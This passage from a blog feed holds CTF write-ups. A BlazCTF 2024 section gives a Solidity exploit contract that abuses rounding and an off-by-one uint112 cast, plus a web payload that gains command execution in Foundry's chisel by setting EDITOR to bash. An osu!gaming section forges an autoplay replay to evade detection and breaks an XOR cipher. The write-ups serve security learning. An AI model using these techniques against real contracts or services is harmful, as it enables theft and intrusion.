class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SafeUint112 {</span><br><span class="line">    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow</span><br><span class="line">    function safeCast(uint256 value) internal pure returns (uint112) {</span><br><span class="line">        require(value &lt;= (1 &lt;&lt; 112), "SafeUint112: value exceeds uint112 max");</span><br><span class="line">        return uint112(value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow</span><br><span class="line">    function safeMul(uint112 a, uint256 b) internal pure returns (uint112) {</span><br><span class="line">        require(uint256(a) * b &lt;= (1 &lt;&lt; 112), "SafeUint112: value exceeds uint112 max");</span><br><span class="line">        return uint112(a * b);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h4 id="題解-3"><a href="#題解-3" class="headerlink" title="題解"></a>題解</h4><p><code>tradeSettlement::settleTrade</code> 在判斷要收多少 token，使用了向下取整（<code>tradeAmount / trade.amountToSell</code>），可以藉此來免費買 token。如下，一次可以買到 9 個。要解題至少要拿 10 ether 個，所以只靠這個是不夠的。在賽中以為他的 <code>SafeUint112</code> 是安全的，所以賽中到這就沒繼續解了。但其實問題就在 其中。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint256 fee = 30 wei;</span><br><span class="line">uint256 amountToSell = 10 ether - fee;</span><br><span class="line">uint256 amountToBuy = 1 ether;</span><br><span class="line">uint256 _amountToSettle = amountToSell / amountToBuy;</span><br><span class="line"></span><br><span class="line">require(_amountToSettle * amountToBuy / amountToSell == 0, "not free");</span><br><span class="line"></span><br><span class="line">tradeSettlement.settleTrade(0, _amountToSettle);</span><br></pre></td></tr></table></figure></div><h5 id="SafeUint112"><a href="#SafeUint112" class="headerlink" title="SafeUint112"></a><code>SafeUint112</code></h5><p><code>SafeUint112.safeCast</code> 的 <code>value &lt;= (1 &lt;&lt; 112)</code> 應該要用 <code>&lt;</code>。不然在 <code>value = 1 &lt;&lt; 112</code> 時會 overflow。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract SafeUint112 {</span><br><span class="line">    /// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow</span><br><span class="line">    function safeCast(uint256 value) internal pure returns (uint112) {</span><br><span class="line">        require(value &lt;= (1 &lt;&lt; 112), "SafeUint112: value exceeds uint112 max");</span><br><span class="line">        return uint112(value);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; uint256 a = 1 &lt;&lt; 112;</span><br><span class="line">&gt; console.log(uint112(a));</span><br><span class="line"></span><br><span class="line">Logs:</span><br><span class="line">  0</span><br></pre></td></tr></table></figure></div><h4 id="解題腳本"><a href="#解題腳本" class="headerlink" title="解題腳本"></a>解題腳本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Solve is CTFSolver {    </span><br><span class="line">    function solve(address challenge, address player) internal override {</span><br><span class="line">        TradeSettlement tradeSettlement = Challenge(challenge).tradeSettlement();</span><br><span class="line">        uint256 fee = 30 wei;</span><br><span class="line">        uint256 amountToSell = 10 ether - fee;</span><br><span class="line">        uint256 amountToBuy = 1 ether;</span><br><span class="line">        uint256 _amountToSettle = amountToSell / amountToBuy;</span><br><span class="line"></span><br><span class="line">        require(_amountToSettle * amountToBuy / amountToSell == 0, "not free");</span><br><span class="line"></span><br><span class="line">        for (uint256 amountDrained = 0; amountDrained &lt; fee; amountDrained += _amountToSettle) </span><br><span class="line">            tradeSettlement.settleTrade(0, _amountToSettle);</span><br><span class="line"></span><br><span class="line">        SimpleERC20 wojak = Challenge(challenge).wojak();</span><br><span class="line">        wojak.approve(address(tradeSettlement), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        tradeSettlement.createTrade(address(wojak), address(wojak), fee+1, 0);</span><br><span class="line"></span><br><span class="line">        // make `uint112(scale+fee) == 0` so we won't be charged when scaling</span><br><span class="line">        uint256 scale = (1 &lt;&lt; 112) - fee;</span><br><span class="line">        tradeSettlement.scaleTrade(1, scale);</span><br><span class="line"></span><br><span class="line">        tradeSettlement.settleTrade(1, wojak.balanceOf(address(tradeSettlement)));</span><br><span class="line">        wojak.transfer(address(0xc0ffee), 10 ether);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><h3 id="Chisel-as-a-Service"><a href="#Chisel-as-a-Service" class="headerlink" title="Chisel as a Service"></a>Chisel as a Service</h3><h4 id="題目-4"><a href="#題目-4" class="headerlink" title="題目"></a>題目</h4><p>目標：取得 <code>/flag-&lt;flag_hash&gt;.txt</code> 內容</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">"express"</span>;</span><br><span class="line"><span class="keyword">import</span> { $ } <span class="keyword">from</span> <span class="string">"zx"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">"public"</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">"/run"</span>, <span class="title function_">async</span> (req, res) =&gt; {</span><br><span class="line">  <span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">const</span> code = <span class="title class_">String</span>(req.<span class="property">query</span>.<span class="property">code</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/^[\x20-\x7E\r\n]*$/</span>.<span class="title function_">test</span>(code) === <span class="literal">false</span>)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Invalid characters"</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(code);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">encodeURIComponent</span>(code));</span><br><span class="line">    <span class="keyword">const</span> commands = code.<span class="title function_">toLowerCase</span>().<span class="title function_">match</span>(<span class="regexp">/![a-z]+/g</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(commands);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(commands !== <span class="literal">null</span> &amp;&amp; (commands.<span class="title function_">includes</span>(<span class="string">"!exec"</span>) || commands.<span class="title function_">includes</span>(<span class="string">"!e"</span>)));</span><br><span class="line">    <span class="keyword">if</span> (commands !== <span class="literal">null</span> &amp;&amp; (commands.<span class="title function_">includes</span>(<span class="string">"!exec"</span>) || commands.<span class="title function_">includes</span>(<span class="string">"!e"</span>)))</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"!exec is not allowed"</span>);</span><br><span class="line">    <span class="keyword">const</span> uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">    <span class="keyword">await</span> $({</span><br><span class="line">      <span class="attr">cwd</span>: <span class="string">"public/out"</span>,</span><br><span class="line">      <span class="attr">timeout</span>: <span class="string">"3s"</span>,</span><br><span class="line">      <span class="attr">input</span>: code,</span><br><span class="line">    })<span class="string">`chisel --no-vm &gt; <span class="subst">${uuid}</span>`</span>;</span><br><span class="line">    res.<span class="title function_">send</span>({ uuid });</span><br><span class="line">  } <span class="keyword">catch</span> {</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">"error"</span>);</span><br><span class="line">  }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>);</span><br></pre></td></tr></table></figure></div><h4 id="題解-4"><a href="#題解-4" class="headerlink" title="題解"></a>題解</h4><p>讀了一下 chisel 的 source code，發現有兩處使用了危險函數。</p><p><code>ChiselCommand::Exec</code> 的 <code>arg</code> 可控，但是在 JavaScript 端會進行過濾，不能出現 <code>!exec</code> 跟 <code>!e</code>。看了一下 rust 端怎麼 parse 的但沒找到繞過的方法。</p><p><a class="link" href="https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L623">https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L623 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ChiselCommand::Exec =&gt; {</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cmd</span> = Command::<span class="title function_ invoke__">new</span>(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> args.<span class="title function_ invoke__">len</span>() &gt; <span class="number">1</span> {</span><br><span class="line">        cmd.<span class="title function_ invoke__">args</span>(args[<span class="number">1</span>..].<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">copied</span>());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> cmd.<span class="title function_ invoke__">output</span>() {</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p><code>ChiselCommand::Edit</code> 裡若可以控環境變數就能自由 RCE，所以要研究哪邊可以控環境變數。Foundry Cheatcode 有可以控環境變數的 <a class="link" href="https://book.getfoundry.sh/cheatcodes/set-env">vm.setEnv <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，但在 JavaScript 指定了 <code> --no-vm</code> 的參數所以沒有 <code>vm</code> 可以用，賽中沒有想到其他可控環境變數的方法。賽後得知其實在  <code> --no-vm</code> 情況下還是有辦法取得 <code>vm</code> 的。</p><p><a class="link" href="https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L651">https://github.com/foundry-rs/foundry/blob/dab903633e4f01db8c604655bfe3c03a893c0827/crates/chisel/src/dispatcher.rs#L651 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ChiselCommand::Edit =&gt; {</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// open the temp file with the editor</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">editor</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">"EDITOR"</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">"vim"</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cmd</span> = Command::<span class="title function_ invoke__">new</span>(editor);</span><br><span class="line">    cmd.<span class="title function_ invoke__">arg</span>(&amp;temp_file_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> cmd.<span class="title function_ invoke__">status</span>() {</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>在有 vm 的 chisel 裡面得知 <code>vm</code> 的地址。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜ address(vm)</span><br><span class="line">Type: address</span><br><span class="line">└ Data: 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span><br></pre></td></tr></table></figure></div><p>可以看到確實在 <code>--no-vm</code> 的情況下可以正常設置環境變數。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; chisel --no-vm</span><br><span class="line">Welcome to Chisel! Type `!<span class="built_in">help</span>` to show available commands.</span><br><span class="line">➜ address vm = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;</span><br><span class="line">➜ vm.call(abi.encodeWithSignature(<span class="string">"setEnv(string,string)"</span>, <span class="string">"EDITOR"</span>, <span class="string">"Ching367436"</span>));</span><br><span class="line">➜ !e <span class="built_in">env</span></span><br><span class="line">PWD=/home</span><br><span class="line">HOME=/root</span><br><span class="line">LC_ALL=en_US.UTF-8</span><br><span class="line">DEBIAN_FRONTEND=noninteractive</span><br><span class="line">TERM=xterm</span><br><span class="line">SHLVL=1</span><br><span class="line">HOSTNAME=25eeccf8b3b2</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.foundry/bin</span><br><span class="line">USER=root</span><br><span class="line">RUST_BACKTRACE=1</span><br><span class="line">EDITOR=Ching367436</span><br></pre></td></tr></table></figure></div><p>這種 RCE 方式的 argument 會有一個包含目前輸入過的 code 的文字檔的 path。</p><div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ChiselCommand::Edit =&gt; {</span><br><span class="line">    <span class="comment">// create a temp file with the content of the run code</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">temp_file_path</span> = std::env::<span class="title function_ invoke__">temp_dir</span>();</span><br><span class="line">    temp_file_path.<span class="title function_ invoke__">push</span>(<span class="string">"chisel-tmp.sol"</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = std::fs::File::<span class="title function_ invoke__">create</span>(&amp;temp_file_path)</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|<span class="keyword">mut</span> file| file.<span class="title function_ invoke__">write_all</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">source</span>().run_code.<span class="title function_ invoke__">as_bytes</span>()));</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = result {</span><br><span class="line">        <span class="keyword">return</span> DispatchResult::<span class="title function_ invoke__">CommandFailed</span>(<span class="built_in">format!</span>(</span><br><span class="line">            <span class="string">"Could not write to a temporary file: {e}"</span></span><br><span class="line">        ))</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// open the temp file with the editor</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">editor</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">"EDITOR"</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">"vim"</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cmd</span> = Command::<span class="title function_ invoke__">new</span>(editor);</span><br><span class="line">    cmd.<span class="title function_ invoke__">arg</span>(&amp;temp_file_path);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>所以可以使用下方這個 payload 在當事網頁跑就會出現 flag。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">"run?code="</span>+<span class="built_in">encodeURIComponent</span><span class="string">`</span></span><br><span class="line"><span class="string">//;cat /flag*</span></span><br><span class="line"><span class="string">address vm = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;</span></span><br><span class="line"><span class="string">vm.call(abi.encodeWithSignature("setEnv(string,string)", "EDITOR", "bash"));</span></span><br><span class="line"><span class="string">!edit</span></span><br><span class="line"><span class="string">`</span>).<span class="title function_">then</span>(<span class="function"><span class="params">e</span>=&gt;</span>e.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">e</span>=&gt;</span>location.<span class="property">hash</span>=e.<span class="property">uuid</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// blaz{m1na_b4k3_y0ur_pizza}</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
    <summary type="html">BlazCTF 2024 是我第一場 Web3 CTF。這次是跟[竹狐](https://ctftime.org/team/280959)一起打（整隊只有我有碰過一點點 Web3 所以基本上是自己打）。題目品質整體算滿不錯的。</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.ching367436.me/tags/ctf/"/>
    
    <category term="blockchain" scheme="https://blog.ching367436.me/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>osu!gaming CTF 2024 Write-up</title>
    <link href="https://blog.ching367436.me/osu-gaming-ctf-2024-write-up/"/>
    <id>https://blog.ching367436.me/osu-gaming-ctf-2024-write-up/</id>
    <published>2024-03-04T02:22:16.000Z</published>
    <updated>2024-03-04T02:22:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>I participated in <a class="link" href="https://ctf.osugaming.lol/">osu!gaming CTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> with <a class="link" href="https://ctftime.org/team/280959">TakeKitsune <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, and here is my write-up of the part I solved.</p><h2 id="OSU"><a href="#OSU" class="headerlink" title="OSU"></a>OSU</h2><h3 id="sanity-check-2"><a href="#sanity-check-2" class="headerlink" title="sanity-check-2"></a>sanity-check-2</h3><blockquote><p><a class="link" href="https://osu.ppy.sh/beatmapsets/2143550">Gawr Gura - Kyoufuu All Back <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Your task is to play <a class="link" href="https://osu.ppy.sh/beatmapsets/2143550#osu/4512653">A <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> difficulty and get at least 70% accuracy in std mode. Submit your replay osr file to server in base64 format.</p></blockquote><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>As a beginner in <code>osu!</code>, I use the <a class="link" href="https://osu.ppy.sh/wiki/en/Gameplay/Game_modifier/No_Fail">No Fail (mod) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to play first and obtain the osr file. Then, I edit the replay using <a class="link" href="https://github.com/thebetioplane/OsuReplayEditor">OsuReplayEditor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to remove any misses or mods.</p><img src="/osu-gaming-ctf-2024-write-up/replay-editor.webp" style="width: min(22em, 100%);"><h3 id="sanity-check-3"><a href="#sanity-check-3" class="headerlink" title="sanity-check-3"></a>sanity-check-3</h3><blockquote><p><a class="link" href="https://osu.ppy.sh/beatmapsets/2143550">Gawr Gura - Kyoufuu All Back <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Alright, it’s gaming time. SS the top diff and submit your replay to the server in base64 format. (Play nomod, please don’t use mods like DT or HR)</p><p><code>nc chal.osugaming.lol 7278</code></p></blockquote><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>First, use <a class="link" href="https://osu.ppy.sh/wiki/en/Gameplay/Game_modifier/Auto">Auto (mod) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to play it to obtain a perfect <code>osr</code> file (<code>osu!(lazer)</code> does not support exporting auto played osr files, so we need to use <code>osu!</code> Instead). However, even autoplay cannot achieve SS (check the video below).</p><video muted="" controls="" style="width: 100%;">  <source src="/osu-gaming-ctf-2024-write-up/almost-ss.mp4" type="video/mp4"></video><p>So I used <a class="link" href="https://github.com/kszlim/osu-replay-parser">osu-replay-parser <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to add a <code>20ms</code> delay to the auto-played <code>osr</code>, and it worked.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> osrparse <span class="keyword">import</span> Replay</span><br><span class="line"></span><br><span class="line"><span class="comment"># parse from a path</span></span><br><span class="line">replay = Replay.from_path(<span class="string">"at.osr"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># anti AT detection</span></span><br><span class="line">replay.username = <span class="string">'ch'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remove the auto play mods</span></span><br><span class="line">replay.mod_combination = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add some time</span></span><br><span class="line">replay.replay_data[<span class="number">1</span>].time_delta += <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write to a new file</span></span><br><span class="line">replay.write_path(<span class="string">"at-modified.osr"</span>)</span><br></pre></td></tr></table></figure></div><h4 id="Malware"><a href="#Malware" class="headerlink" title="Malware"></a>Malware</h4><p>I stumbled upon <a class="link" href="https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer">RedLine Stealer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> malware while searching for an osu! cheat tool. Interestingly, I had recently reversed it at <a class="link" href="https://gcc.ac/">GCC 2024 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p><p><img src="/osu-gaming-ctf-2024-write-up/osu-cheat.webp" alt="osu-cheat"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="secret-map"><a href="#secret-map" class="headerlink" title="secret-map"></a>secret-map</h3><blockquote><p>Here’s an <a class="link" href="https://osu.ppy.sh/beatmapsets/1680153#osu/3432455">old, unfinished map <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> of mine (any collabers?). I tried adding an new diff but it seems to have gotten corrupted - can you help me recover it?</p><p>Downloads: [Alfakyun. - KING.osz](<a class="link" href="https://ctf.osugaming.lol/uploads/2cdc85778a40b176f4541bc782650cf933dd9997083d69e928cd9b4b85e0c189/Alfakyun">https://ctf.osugaming.lol/uploads/2cdc85778a40b176f4541bc782650cf933dd9997083d69e928cd9b4b85e0c189/Alfakyun <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. - KING.osz)</p></blockquote><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>We first decompress the <code>osz</code> file using <code>7z x file.osz</code>.</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── extracted</span><br><span class="line">    ├── Alfakyun. - KING (QuintecX) [ryuk eyeka's easy].osu</span><br><span class="line">    ├── audio.mp3</span><br><span class="line">    ├── bg.webp</span><br><span class="line">    ├── enc.py</span><br><span class="line">    ├── flag.osu.enc</span><br></pre></td></tr></table></figure></div><p>In <code>enc.py</code>, the osu file is encrypted using XOR with a random 16-byte key. However, since the <code>osu</code> file starts with <code>osu file format v14</code>, the key can be obtained using it.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># enc.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">xor_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"flag.osu"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    plaintext = f.read()</span><br><span class="line"></span><br><span class="line">encrypted_data = <span class="built_in">bytes</span>([plaintext[i] ^ xor_key[i % <span class="built_in">len</span>(xor_key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"flag.osu.enc"</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(encrypted_data)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sol.py</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'flag.osu.enc'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line">known_pt = <span class="string">b'osu file format v14'</span>[:<span class="number">16</span>]</span><br><span class="line">key = <span class="built_in">bytes</span>([encrypted_data[i] ^ known_pt[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([data[i] ^ key[i % <span 